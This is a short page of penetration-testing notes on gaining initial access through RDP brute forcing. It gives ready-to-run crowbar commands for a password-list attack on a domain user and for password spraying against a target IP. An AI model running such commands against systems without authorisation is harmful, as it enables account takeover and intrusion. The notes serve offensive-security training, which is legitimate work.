---
title: "Initial Access"
date: 2020-07-17T20:56:11+02:00
draft: false
---

####  RDP brute forcing
RDP brute forcing can be done using hydra or ncrack, but experience with crowbar has been best.
Basic usage:
```
$ ./crowbar.py -b rdp -u DOMAIN\\user -C passwords.txt -s 10.68.35.150/32
```
Local users can also be attacked (when no domain is specified). It's also possible to perform a password spraying attack on your target:
```
$ ./crowbar.py -b rdp -U users.txt -c 'summer2020!' -s 10.68.35.150/32
```